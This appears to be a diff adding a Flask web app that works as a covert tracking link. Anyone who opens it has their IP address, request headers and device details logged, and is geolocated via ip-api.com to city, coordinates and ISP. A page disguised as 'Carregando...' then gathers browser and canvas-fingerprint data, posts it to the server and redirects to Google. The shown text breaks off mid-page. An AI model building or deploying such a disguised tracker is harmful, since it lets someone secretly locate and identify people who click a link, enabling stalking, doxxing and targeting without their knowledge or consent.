@@ -1,0 +1,139 @@
+from flask import Flask, request, jsonify, render_template_string
+import json
+import datetime
+import requests
+from user_agents import parse
+
+app = Flask(__name__)
+
+# Página que o usuário acessa (link encurtado/tracker)
+@app.route('/')
+def tracker():
+    # Coleta dados do servidor
+    data = {
+        'timestamp': datetime.datetime.now().isoformat(),
+        'ip_address': request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr),
+        'user_agent': request.headers.get('User-Agent'),
+        'referrer': request.headers.get('Referer'),
+        'accept_language': request.headers.get('Accept-Language'),
+        'accept_encoding': request.headers.get('Accept-Encoding'),
+        'connection': request.headers.get('Connection'),
+        'host': request.headers.get('Host'),
+        'headers': dict(request.headers),
+    }
+    
+    # Parse do User-Agent
+    ua = parse(request.headers.get('User-Agent', ''))
+    data['device'] = {
+        'browser': ua.browser.family,
+        'browser_version': str(ua.browser.version),
+        'os': ua.os.family,
+        'os_version': str(ua.os.version),
+        'device': ua.device.family,
+        'is_mobile': ua.is_mobile,
+        'is_tablet': ua.is_tablet,
+        'is_pc': ua.is_pc,
+        'is_bot': ua.is_bot
+    }
+    
+    # Geolocalização via IP (API gratuita)
+    try:
+        ip = data['ip_address'].split(',')[0].strip()
+        if ip != '127.0.0.1':
+            geo_response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
+            if geo_response.status_code == 200:
+                geo_data = geo_response.json()
+                data['geolocation'] = {
+                    'country': geo_data.get('country'),
+                    'country_code': geo_data.get('countryCode'),
+                    'region': geo_data.get('regionName'),
+                    'city': geo_data.get('city'),
+                    'zip': geo_data.get('zip'),
+                    'lat': geo_data.get('lat'),
+                    'lon': geo_data.get('lon'),
+                    'timezone': geo_data.get('timezone'),
+                    'isp': geo_data.get('isp'),
+                    'org': geo_data.get('org'),
+                    'as': geo_data.get('as')
+                }
+    except Exception as e:
+        data['geolocation_error'] = str(e)
+    
+    # Salva em arquivo
+    with open('clicks_data.jsonl', 'a', encoding='utf-8') as f:
+        f.write(json.dumps(data, ensure_ascii=False) + '\n')
+    
+    # HTML com JavaScript para coletar mais dados do cliente
+    html = '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Carregando...</title>
+        <script>
+            // Coleta informações do navegador/dispositivo
+            const clientData = {
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                },
+                window: {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight
+                },
+                navigator: {
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    platform: navigator.platform,
+                    cookieEnabled: navigator.cookieEnabled,
+                    onLine: navigator.onLine,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    maxTouchPoints: navigator.maxTouchPoints,
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    connection: navigator.connection ? {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt
+                    } : null
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                localTime: new Date().toString(),
+                plugins: Array.from(navigator.plugins).map(p => p.name),
+                pdfViewerEnabled: navigator.pdfViewerEnabled,
+                webdriver: navigator.webdriver,
+                doNotTrack: navigator.doNotTrack,
+                touchSupport: 'ontouchstart' in window,
+                canvas_fingerprint: (function() {
+                    try {
+                        const canvas = document.createElement('canvas');
+                        const ctx = canvas.getContext('2d');
+                        ctx.textBaseline = 'top';
+                        ctx.font = '14px Arial';
+                        ctx.fillText('Fingerprint', 2, 2);
+                        return canvas.toDataURL('image/png').slice(-50);
+                    } catch(e) {
+                        return null;
+                    }
+                })()
+            };
+            
+            // Envia dados para o servidor
+            fetch('/collect', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(clientData)
+            }).then(() => {
+                // Redireciona após coleta (opcional)
+                window.location.href = 'https://www.google.com';
+            });
+        </script>
+    </head>
+    <body>
+        <p>Carregando...</p>
+    </body>
